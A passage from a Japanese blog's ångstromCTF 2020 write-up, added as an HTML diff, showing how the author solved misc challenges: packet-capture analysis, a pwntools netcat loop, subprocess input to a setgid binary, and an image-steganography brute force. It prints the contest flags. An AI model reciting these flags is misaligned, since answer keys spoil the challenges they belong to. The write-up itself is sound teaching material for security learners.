@@ -1,0 +1,1463 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+		<title>ångstromCTF 2020 &middot; kuzushikiのぺーじ</title>
+		<link rel="canonical" href="https://kuzushiki.github.io/post/angstrom_ctf_2020/">
+		<link rel="stylesheet" type="text/css" href="https://kuzushiki.github.io/css/main.css" />
+		
+	</head>
+	<body>
+		<a id="title" href="https://kuzushiki.github.io/" title="kuzushikiのぺーじ">
+			
+				<img id="logo" alt="Logo" src="https://kuzushiki.github.io/images/logo.png" />
+			
+			
+				<h1>kuzushikiのぺーじ</h1>
+			
+		</a>
+		
+			<h4>セキュリティに関することを書きたいですね</h4>
+		
+		<div id="social">
+			
+			
+			
+			<a href="https://github.com/kuzushiki" title="Github">
+				<img alt="GitHub" height="64px" width="64px" src="https://kuzushiki.github.io/images/github.svg" />
+			</a>
+			
+			
+			
+			<a href="https://twitter.com/kuzu7shiki" title="Twitter">
+				<img alt="Twitter" height="64px" width="64px" src="https://kuzushiki.github.io/images/twitter.svg" />
+			</a>
+			
+			
+                        
+		</div>
+		<div class="links">
+			<a href="https://kuzushiki.github.io/">Home</a>
+			
+				<a href="https://kuzushiki.github.io/post/">Archive</a>
+			
+			
+				
+			
+				
+					<a href="https://kuzushiki.github.io/pages/resume/">Résumé</a>
+				
+			
+		</div>
+
+	<div class="postBody">
+		<div class="post">
+			<h1>ångstromCTF 2020</h1>
+			<span class="post-meta">Thu, Mar 19, 2020 - Read in 22 Min</span>
+			<div class="content">
+			<nav id="TableOfContents">
+  <ul>
+    <li><a href="#sanity-check-misc-5-pts-1002-solves">Sanity Check (Misc, 5 pts, 1002 solves)</a></li>
+    <li><a href="#survey-misc-5-pts-367-solves">Survey (Misc, 5 pts, 367 solves)</a></li>
+    <li><a href="#ws1-misc-30-pts-1225-solves">ws1 (Misc, 30 pts, 1225 solves)</a></li>
+    <li><a href="#clam-clam-clam-misc-70-pts-495-solves">clam clam clam (Misc, 70 pts, 495 solves)</a></li>
+    <li><a href="#ws2-misc-80-pts-811-solves">ws2 (Misc, 80 pts, 811 solves)</a></li>
+    <li><a href="#psk-misc-90-pts-270-solves">PSK (Misc, 90 pts, 270 solves)</a></li>
+    <li><a href="#inputter-misc-100-pts-369-solves">Inputter (Misc, 100 pts, 369 solves)</a></li>
+    <li><a href="#msd-misc-140-pts-198-solves">msd (Misc, 140 pts, 198 solves)</a></li>
+    <li><a href="#shifter-misc-160-pts-454-solves">Shifter (Misc, 160 pts, 454 solves)</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#the-magic-word-web-20-pts-1304-solves">The Magic Word (Web, 20 pts, 1304 solves)</a></li>
+    <li><a href="#xmas-still-stands-web-50-pts-459-solves">Xmas Still Stands (Web, 50 pts, 459 solves)</a></li>
+    <li><a href="#git-good-web-70-pts-536-solves">Git Good (Web, 70 pts, 536 solves)</a></li>
+    <li><a href="#secret-agents-web-110-pts-520-solves">Secret Agents (Web, 110 pts, 520 solves)</a></li>
+    <li><a href="#defunds-crypt-web-120-pts-303-solves">Defund&rsquo;s Crypt (Web, 120 pts, 303 solves)</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#keysar-crypto-40-pts-867-solves">Keysar (Crypto, 40 pts, 867 solves)</a></li>
+    <li><a href="#reasonably-strong-algorithm-crypto-70-pts-742-solves">Reasonably Strong Algorithm (Crypto, 70 pts, 742 solves)</a></li>
+    <li><a href="#wacko-images-crypto-90-pts-494-solves">Wacko Images (Crypto, 90 pts, 494 solves)</a></li>
+    <li><a href="#confused-streaming-crypto-100-pts-297-solves">Confused Streaming (Crypto, 100 pts, 297 solves)</a></li>
+    <li><a href="#one-time-bad-crypto-100-pts-248-solves">one time bad (Crypto, 100 pts, 248 solves)</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#no-canary-binary-50-pts-531-solves">No Canary (Binary, 50 pts, 531 solves)</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#revving-up-rev-50-pts-926-solves">Revving Up (Rev, 50 pts, 926 solves)</a></li>
+    <li><a href="#windows-of-opportunity-rev-50-pts-772-solves">Windows of Opportunity (Rev, 50 pts, 772 solves)</a></li>
+    <li><a href="#taking-off-rev-70-pts-523-solves">Taking Off (Rev, 70 pts, 523 solves)</a></li>
+    <li><a href="#patcherman-rev-100-pts-259-solves">Patcherman (Rev, 100 pts, 259 solves)</a></li>
+    <li><a href="#感想">感想</a></li>
+  </ul>
+</nav>
+			<h1 id="ångstromctf-2020に参加しました">ångstromCTF 2020に参加しました！</h1>
+<p>(team: score_gazer)</p>
+<p>自分は1770点を入れ、順位は204位 / 1596チーム(0点は除く)でした。</p>
+<p><img src="https://user-images.githubusercontent.com/50363796/77066419-799f3580-6a26-11ea-9602-a92ec5f5e6ee.PNG" alt="キャプチャ"></p>
+<p><img src="https://user-images.githubusercontent.com/50363796/77066480-96d40400-6a26-11ea-8fd2-c1961d03d627.png" alt="FireShot Capture 025 - Challenges - ångstromCTF 2020 - 2020 angstromctf com"></p>
+<p>write upを書いていきます</p>
+<h1 id="misc">MISC</h1>
+<h2 id="sanity-check-misc-5-pts-1002-solves">Sanity Check (Misc, 5 pts, 1002 solves)</h2>
+<pre><code>Join our Discord!
+https://discord.gg/Dduuscw
+</code></pre><p>問題文のURLにアクセスするとyoutubeに飛ばされます。</p>
+<p>CTFページヘッダーの<code>Chat</code>から<code>Discord</code>に行きましょう。</p>
+<p>#generalの上部にフラグが書かれています。</p>
+<p><code>actf{never_gonna_let_you_down}</code></p>
+<h2 id="survey-misc-5-pts-367-solves">Survey (Misc, 5 pts, 367 solves)</h2>
+<pre><code>Thanks for playing this CTF! Please fill out our survey so that we can improve ångstromCTF next year. This challenge does not affect time-based tiebreakers.
+</code></pre><p>アンケート問題です。</p>
+<p>答えるとフラグがゲットできます。</p>
+<p><code>actf{never_gonna_run_around_and_desert_you}</code></p>
+<h2 id="ws1-misc-30-pts-1225-solves">ws1 (Misc, 30 pts, 1225 solves)</h2>
+<pre><code>Find my password from this recording (:
+</code></pre><p>問題ファイル: <code>recording.pcapng</code></p>
+<p><code>wireshark</code>でパケットを確認していくと、</p>
+<p>TCPパケットにフラグが書かれていました。</p>
+<p><img src="https://user-images.githubusercontent.com/50363796/77066727-02b66c80-6a27-11ea-971d-f667fe25e056.PNG" alt="キャプチャww"></p>
+<p><code>actf{wireshark_isn't_so_bad_huh-a9d8g99ikdf}</code></p>
+<p>平文で書かれているので<code>strings</code>コマンドでも確認できました。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:/media/sf_share/CTF/angstrom# strings recording.pcapng  | grep actf
+flagz,actf<span style="color:#f92672">{</span>wireshark_isn<span style="color:#960050;background-color:#1e0010">&#39;</span>t_so_bad_huh-a9d8g99ikdf<span style="color:#f92672">}</span>
+</code></pre></div><h2 id="clam-clam-clam-misc-70-pts-495-solves">clam clam clam (Misc, 70 pts, 495 solves)</h2>
+<pre><code>clam clam clam clam clam clam clam clam clam nc misc.2020.chall.actf.co 20204 clam clam clam clam clam clam
+</code></pre><p>問題文にncコマンドが書かれているので、アクセスしてみます。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:/media/sf_share/CTF/angstrom# nc misc.2020.chall.actf.co <span style="color:#ae81ff">20204</span>
+clam<span style="color:#f92672">{</span>clam_clam_clam_clam_clam<span style="color:#f92672">}</span>
+malc<span style="color:#f92672">{</span>malc_malc_malc_malc_malc<span style="color:#f92672">}</span>
+clam<span style="color:#f92672">{</span>clam_clam_clam_clam_clam<span style="color:#f92672">}</span>
+malc<span style="color:#f92672">{</span>malc_malc_malc_malc_malc<span style="color:#f92672">}</span>
+clam<span style="color:#f92672">{</span>clam_clam_clam_clam_clam<span style="color:#f92672">}</span>
+malc<span style="color:#f92672">{</span>malc_malc_malc_malc_malc<span style="color:#f92672">}</span>
+clam<span style="color:#f92672">{</span>clam_clam_clam_clam_clam<span style="color:#f92672">}</span>
+malc<span style="color:#f92672">{</span>malc_malc_malc_malc_malc<span style="color:#f92672">}</span>
+clam<span style="color:#f92672">{</span>clam_clam_clam_clam_clam<span style="color:#f92672">}</span>
+:
+:
+延々と続く
+</code></pre></div><p>おそらく見えない文字で何かが隠されているのでしょう。</p>
+<p><code>python</code>でサーバからの通信を受け取ってバイトのまま表示してみます。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">misc.2020.chall.actf.co</span><span style="color:#e6db74">&#39;</span>, <span style="color:#ae81ff">20204</span>)
+<span style="color:#66d9ef">while</span> True:
+    data <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()
+    <span style="color:#66d9ef">print</span>(data)
+</code></pre></div><p>実行結果は以下の通り</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">:
+:
+b<span style="color:#e6db74">&#39;clam{clam_clam_clam_clam_clam}\n&#39;</span>
+b<span style="color:#e6db74">&#39;type &#34;clamclam&#34; for salvation\rmalc{malc_malc_malc_malc_malc}\n&#39;</span>
+b<span style="color:#e6db74">&#39;clam{clam_clam_clam_clam_clam}\n&#39;</span>
+:
+:
+</code></pre></div><p><code>b'type &quot;clamclam&quot; for salvation\r</code></p>
+<p>と書かれていました。</p>
+<p><code>\r</code>で上書きされており見えなかったのでした。</p>
+<p>上記メッセージを受け取ったら<code>clamclam</code>を返すようにプログラムを改良しましょう</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">misc.2020.chall.actf.co</span><span style="color:#e6db74">&#39;</span>, <span style="color:#ae81ff">20204</span>)
+
+<span style="color:#66d9ef">while</span> True:
+    data <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()
+    <span style="color:#66d9ef">if</span> data <span style="color:#f92672">!=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">clam{clam_clam_clam_clam_clam}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">and</span> data <span style="color:#f92672">!=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">malc{malc_malc_malc_malc_malc}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>:
+        io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">clamclam</span><span style="color:#e6db74">&#39;</span>)
+    <span style="color:#66d9ef">print</span>(data)
+</code></pre></div><p>フラグが返ってきました！！</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:/media/sf_share/CTF/angstrom# python3 calm.py 
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to misc.2020.chall.actf.co on port 20204: Done
+b<span style="color:#e6db74">&#39;type &#34;clamclam&#34; for salvation\rmalc{malc_malc_malc_malc_malc}\n&#39;</span>
+b<span style="color:#e6db74">&#39;actf{cl4m_is_my_f4v0rite_ctfer_in_th3_w0rld}\n&#39;</span>
+</code></pre></div><h2 id="ws2-misc-80-pts-811-solves">ws2 (Misc, 80 pts, 811 solves)</h2>
+<pre><code>No ascii, not problem :)
+</code></pre><p>問題ファイル: <code>recording2.pcapng</code></p>
+<p>どうやら今度は平文ではないようです。</p>
+<p>こんな時は<code>wireshark</code>のオブジェクト抽出機能を使ってみます。</p>
+<p><code>File -&gt; Export Objects -&gt; HTTP</code>と選択すると、いくつかのオブジェクトが検出されました。</p>
+<p>全て保存して<code>cat</code>コマンドで見てみました。</p>
+<p>一部を表示します。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;!DOCTYPE html PUBLIC &#34;-//W3C//DTD HTML 3.2 Final//EN&#34;&gt;</span>&lt;<span style="color:#f92672">html</span>&gt;
+&lt;<span style="color:#f92672">title</span>&gt;Upload Result Page&lt;/<span style="color:#f92672">title</span>&gt;
+&lt;<span style="color:#f92672">body</span>&gt;
+&lt;<span style="color:#f92672">h2</span>&gt;Upload Result Page&lt;/<span style="color:#f92672">h2</span>&gt;
+&lt;<span style="color:#f92672">hr</span>&gt;
+&lt;<span style="color:#f92672">strong</span>&gt;Success:&lt;/<span style="color:#f92672">strong</span>&gt;File &#39;/Users/toaster/Desktop/personal/projects/angstromctf/2020/misc/ws2/flag.jpg&#39; upload success!&lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://localhost/&#34;</span>&gt;back&lt;/<span style="color:#f92672">a</span>&gt;&lt;<span style="color:#f92672">hr</span>&gt;&lt;<span style="color:#f92672">small</span>&gt;Powerd By: bones7456, check new version at &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://li2z.cn/?s=SimpleHTTPServerWithUpload&#34;</span>&gt;here&lt;/<span style="color:#f92672">a</span>&gt;.&lt;/<span style="color:#f92672">small</span>&gt;&lt;/<span style="color:#f92672">body</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><p>どうやら<code>flag.jpg</code>というファイルがやり取りされているようです。</p>
+<p>しかし<code>jpg</code>ファイルは抽出できていません。</p>
+<p>ここで<code>NetworkMiner</code>という別のツールを使うことにしました。</p>
+<p><code>pcapng</code>形式に対応していないので、一度<code>wireshark</code>で<code>pcap</code>形式にしてから開きます。</p>
+<p>画像が確認できました！！</p>
+<p><img src="https://user-images.githubusercontent.com/50363796/77066800-24175880-6a27-11ea-868d-a5601959e0bf.jpg" alt="flag"></p>
+<p>画像左下にフラグが書いてあります。</p>
+<h2 id="psk-misc-90-pts-270-solves">PSK (Misc, 90 pts, 270 solves)</h2>
+<pre><code>My friend sent my yet another mysterious recording...
+
+He told me he was inspired by PicoCTF 2019 and made his own transmissions. I've looked at it, and it seems to be really compact and efficient.
+
+Only 31 bps!!
+
+See if you can decode what he sent to me. It's in actf{} format
+</code></pre><p>PicoCTF 2019では<code>SSTV</code>という通信方式（音声から映像に変換可能）の問題が出題されました。</p>
+<p>今回もその類の問題でしょう。</p>
+<p><code>PSK decode tool</code>などのワードで検索すると、<a href="http://f6cte.free.fr/index_anglais.htm">MultiPSK</a>というツールが見つかりました。</p>
+<p>このツール、とても使いづらかったです。</p>
+<p>今後のために、音声信号から文字列を得る方法を記載していきます。</p>
+<p>まず開くとこの画面が。</p>
+<p><img src="https://user-images.githubusercontent.com/50363796/77066827-3396a180-6a27-11ea-8d5c-7ba455f47224.PNG" alt="キャプチャpsk"></p>
+<p>左下にある<code>RX/TX screen</code>ボタンを押しましょう。</p>
+<p>（音声ファイルを選択する箇所がありますが、有料アカウントでないと使えないようです。）</p>
+<p>そして問題ファイルの音声を読み込ませると、信号のピークが1500Hz付近に現れます。</p>
+<p>（PCの音声入力設定を<code>システムミキサー</code>にすることで、PCで再生した音をそのまま読み込ませることが可能です）</p>
+<p>そして信号のピーク部分を選択すると、その部分が青くなり、信号を読み込めます。</p>
+<p><img src="https://user-images.githubusercontent.com/50363796/77066869-4a3cf880-6a27-11ea-8d44-f7d4f54e60c5.PNG" alt="キャプチャpsk2"></p>
+<p>画面下部にフラグが現れます。</p>
+<p><code>actf{hamhamhamhamham}</code></p>
+<h2 id="inputter-misc-100-pts-369-solves">Inputter (Misc, 100 pts, 369 solves)</h2>
+<pre><code>Clam really likes challenging himself. When he learned about all these weird unprintable ASCII characters he just HAD to put it in a challenge. Can you satisfy his knack for strange and hard-to-input characters? Source.
+
+Find it on the shell server at /problems/2020/inputter/.
+</code></pre><p>まず問題のソースを見てみましょう</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#</span><span style="color:#75715e">define _GNU_SOURCE</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#</span><span style="color:#75715e">include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span><span style="color:#75715e">#</span><span style="color:#75715e">include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span><span style="color:#75715e">#</span><span style="color:#75715e">include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span><span style="color:#75715e">#</span><span style="color:#75715e">include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span><span style="color:#75715e">#</span><span style="color:#75715e">include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#</span><span style="color:#75715e">define FLAGSIZE 128</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">print_flag</span>() {
+    gid_t gid <span style="color:#f92672">=</span> getegid();
+    setresgid(gid, gid, gid);
+    FILE <span style="color:#f92672">*</span>file <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">flag.txt</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;</span>);
+    <span style="color:#66d9ef">char</span> flag[FLAGSIZE];
+    <span style="color:#66d9ef">if</span> (file <span style="color:#f92672">=</span><span style="color:#f92672">=</span> NULL) {
+        printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Cannot read flag file.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+        exit(<span style="color:#ae81ff">1</span>);
+    }
+    fgets(flag, FLAGSIZE, file);
+    printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span>, flag);
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv[]) {
+    setvbuf(stdout, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+    <span style="color:#66d9ef">if</span> (argc <span style="color:#f92672">!</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>) {
+        puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Your argument count isn&#39;t right.</span><span style="color:#e6db74">&#34;</span>);
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+    }
+    <span style="color:#66d9ef">if</span> (strcmp(argv[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#ae81ff">\x07</span><span style="color:#e6db74">&#34;</span>)) {
+        puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Your argument isn&#39;t right.</span><span style="color:#e6db74">&#34;</span>);
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+    }
+    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">128</span>];
+    fgets(buf, <span style="color:#ae81ff">128</span>, stdin);
+    <span style="color:#66d9ef">if</span> (strcmp(buf, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#ae81ff">\x01</span><span style="color:#ae81ff">\x02</span><span style="color:#ae81ff">\x03</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)) {
+        puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Your input isn&#39;t right.</span><span style="color:#e6db74">&#34;</span>);
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+    }
+    puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">You seem to know what you&#39;re doing.</span><span style="color:#e6db74">&#34;</span>);
+    print_flag();
+}
+</code></pre></div><p>値の比較をしている箇所が２つあります。
+<code>strcmp(argv[1], &quot; \n'\&quot;\x07&quot;)</code>
+<code>strcmp(buf, &quot;\x00\x01\x02\x03\n&quot;)</code></p>
+<p>これを両方一致させればクリアのようです。</p>
+<p><code>\x07</code>などの文字を<code>shell</code>から読み込ませるのは難しいので、今回は<code>python3</code>の<code>subprocess</code>を使いました。</p>
+<p><code>arg</code>を引数、<code>input</code>を入力とすると、</p>
+<p><code>subprocess.run([&quot;./inputter&quot;, arg], input=input)</code></p>
+<p>で<code>inputter</code>に値を渡すことができます。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">team5954@actf:/problems/2020/inputter$ python3
+Python 3.5.2 <span style="color:#f92672">(</span>default, Oct  <span style="color:#ae81ff">8</span> 2019, 13:06:37<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>GCC 5.4.0 20160609<span style="color:#f92672">]</span> on linux
+Type <span style="color:#e6db74">&#34;help&#34;</span>, <span style="color:#e6db74">&#34;copyright&#34;</span>, <span style="color:#e6db74">&#34;credits&#34;</span> or <span style="color:#e6db74">&#34;license&#34;</span> <span style="color:#66d9ef">for</span> more information.
+&gt;&gt;&gt; import subprocess
+&gt;&gt;&gt; arg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39; \n\&#39;</span><span style="color:#e6db74">&#34;\x07&#39;
+</span><span style="color:#e6db74">&gt;&gt;&gt; input = b&#39;\x00\x01\x02\x03\n&#39;
+</span><span style="color:#e6db74">&gt;&gt;&gt; subprocess.run([&#34;</span>./inputter<span style="color:#e6db74">&#34;, arg], input=input)
+</span><span style="color:#e6db74">You seem to know what you&#39;re doing.
+</span><span style="color:#e6db74">actf{impr4ctic4l_pr0blems_c4ll_f0r_impr4ctic4l_s0lutions}
+</span><span style="color:#e6db74">CompletedProcess(args=[&#39;./inputter&#39;, &#39; \n\&#39;&#34;</span><span style="color:#ae81ff">\x</span>07<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">]</span>, returncode<span style="color:#f92672">=</span>0<span style="color:#f92672">)</span>
+
+actf<span style="color:#f92672">{</span>impr4ctic4l_pr0blems_c4ll_f0r_impr4ctic4l_s0lutions<span style="color:#f92672">}</span>
+
+</code></pre></div><h2 id="msd-misc-140-pts-198-solves">msd (Misc, 140 pts, 198 solves)</h2>
+<pre><code>You thought Angstrom would have a stereotypical LSB challenge... You were wrong! To spice it up, we're now using the Most Significant Digit. Can you still power through it?
+
+Here's the encoded image, and here's the original image, for the... well, you'll see.
+
+Important: Redownload the image if you have one from before 11:30 AM 3/14/20. Important: Don't use Python 3.8, use an older version of Python 3!
+</code></pre><p>暗号化した画像、元の画像、プログラムのソースが与えられます。</p>
+<p>とりあえずソースを見てみましょう。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> PIL <span style="color:#f92672">import</span> Image
+
+im <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">breathe.jpg</span><span style="color:#e6db74">&#39;</span>)
+im2 <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">breathe.jpg</span><span style="color:#e6db74">&#34;</span>)
+
+width, height <span style="color:#f92672">=</span> im<span style="color:#f92672">.</span>size
+
+flag <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">REDACT</span><span style="color:#e6db74">&#34;</span>
+flag <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join([str(ord(i)) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> flag])
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encode</span>(i, d):
+    i <span style="color:#f92672">=</span> list(str(i))
+    i[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> d
+
+    <span style="color:#66d9ef">return</span> int(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join(i))
+    
+
+c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+
+<span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(height):
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(width):
+        data <span style="color:#f92672">=</span> []
+        <span style="color:#66d9ef">for</span> a <span style="color:#f92672">in</span> im<span style="color:#f92672">.</span>getpixel((i,j)):
+            data<span style="color:#f92672">.</span>append(encode(a, flag[c <span style="color:#f92672">%</span> len(flag)]))
+
+            c<span style="color:#f92672">+</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+
+        im<span style="color:#f92672">.</span>putpixel((i,j), tuple(data))
+        
+im<span style="color:#f92672">.</span>save(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">output.png</span><span style="color:#e6db74">&#34;</span>)
+pixels <span style="color:#f92672">=</span> im<span style="color:#f92672">.</span>load()
+</code></pre></div><p>フラグの文字コードを文字列として繋げたものを鍵として使っているようです。</p>
+<p>こんな感じです。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">&gt;&gt;</span><span style="color:#f92672">&gt;</span> flag <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">REDACT</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#f92672">&gt;&gt;</span><span style="color:#f92672">&gt;</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join([str(ord(i)) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> flag])
+<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">826968656784</span><span style="color:#e6db74">&#39;</span>
+</code></pre></div><p>鍵は１桁ずつ使っているので必ず0~9の範囲であることが分かります。</p>
+<p>よって、元画像を0~9の総当たりで暗号化し、暗号化した画像と比べていけばフラグを復元できそうです。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> PIL <span style="color:#f92672">import</span> Image
+im <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">breathe.jpg</span><span style="color:#e6db74">&#39;</span>)
+im2 <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">output.png</span><span style="color:#e6db74">&#39;</span>)
+width, height <span style="color:#f92672">=</span> im<span style="color:#f92672">.</span>size
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encode</span>(i, d):
+    i <span style="color:#f92672">=</span> list(str(i))
+    i[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> d
+    <span style="color:#66d9ef">return</span> int(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join(i))
+
+flag <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>
+buf <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>
+<span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(height):
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(width):
+        <span style="color:#66d9ef">for</span> a,b <span style="color:#f92672">in</span> zip(im<span style="color:#f92672">.</span>getpixel((i,j)), im2<span style="color:#f92672">.</span>getpixel((i,j))):
